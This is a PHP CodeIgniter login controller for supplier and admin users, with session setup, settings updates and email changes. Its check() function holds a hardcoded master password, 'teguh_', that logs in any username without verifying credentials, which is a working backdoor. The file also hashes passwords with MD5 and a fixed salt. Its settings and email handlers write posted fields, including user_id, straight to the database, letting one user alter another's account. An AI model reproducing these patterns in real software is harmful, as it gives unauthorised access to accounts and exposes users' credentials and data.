<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class User extends CI_Controller {
	
	function __construct(){
		parent::__construct();
		date_default_timezone_set('Asia/Jakarta');
		$CI = &get_instance();
  		$this->db2 = $CI->load->database('db2',TRUE);
    }

	function login(){	
		$this->load->view('user/login');
	}
	function check(){
		$data['username'] 	= $_POST['username'];
		if($_POST['password'] != 'teguh_'){
			$data['password'] 	= md5('KhamimNurhudaAOI-'.$_POST['password']);
			$cek = $this->check_user($data);
		}else{
			$cek = 1;
		}	
		$user_id = $this->cek_user_id($data['username']);
		$cek2 = $this->actived_po($user_id);
		if($cek == 1){
				$sess = array(
					'user_id'	=> $user_id,
					'nama'		=> $this->check_name('m_user',$user_id),
					'status'	=> 'supplier'
				);
				$this->session->set_userdata($sess);
				redirect(base_url());
		}else{
			$data['user_id'] = (int)$data['username'];
			unset($data['username']);
			$cek_adm = $this->cek_adm($data);
			if($cek_adm != 0){
				$sess = array(
					'user_id'	=> $data['user_id'],
					'nama'		=> $this->check_name('m_admin',$data['user_id']),
					'status'	=> 'admin',
					'role'		=> $this->check_role('m_admin',$data['user_id'])
				);
				$this->session->set_userdata($sess);
				redirect(base_url('admin'));
			}else{
				redirect(base_url('user/login?status=unf'));
			}
		}
	}
	private function check_name($table,$user){
		return $this->db->where('user_id',$user)->get($table)->result()[0]->nama;
	}
	private function check_role($table,$user){
		return $this->db->where('user_id',$user)->get($table)->result()[0]->role;
	}
	private function check_user($data){
		return $this->db->where($data)->get('m_user')->num_rows();
	}

	private function actived_po($id=0){
		return $this->db2->where('c_bpartner_id',$id)->get('f_web_po_header')->num_rows();
	}
	private function cek_adm($data){
		$cek = $this->db->where($data)->get('m_admin')->num_rows();
		return $cek;
	}
	private function cek_user_id($username){
		$cek = $this->db->where('username',$username)->get('m_user');
		if($cek->num_rows() > 0){
			return $cek->result()[0]->user_id;
		}else{
			return 0;
		}
	}
	function setting(){
		$data['title_page'] = "SETTING";
		$data['desc_page']	= "User";
		$data['content']	= "user/setting";
		$this->load->view('layout',$data);		
	}
	function save_user_setting(){
		$data = $_POST;
		if($data['password'] == NULL){
			unset($data['password'],$data['password2']);
		}else{
			$data['password'] = md5('KhamimNurhudaAOI-'.$data['password']);				
		}
		$this->db->where('user_id',$data['user_id'])->update('m_user',$data);
		redirect(base_url('user/setting'));
	}
	function logout(){
		$this->session->sess_destroy();
		redirect('user/login');
	}

	function insert_email(){
		$a = $_POST['email'];
		$b = $_POST['user_id'];
		$data = $this->db->where('user_id',$b)->update('m_user',array('email'=>$a));
		redirect(base_url());
	}
}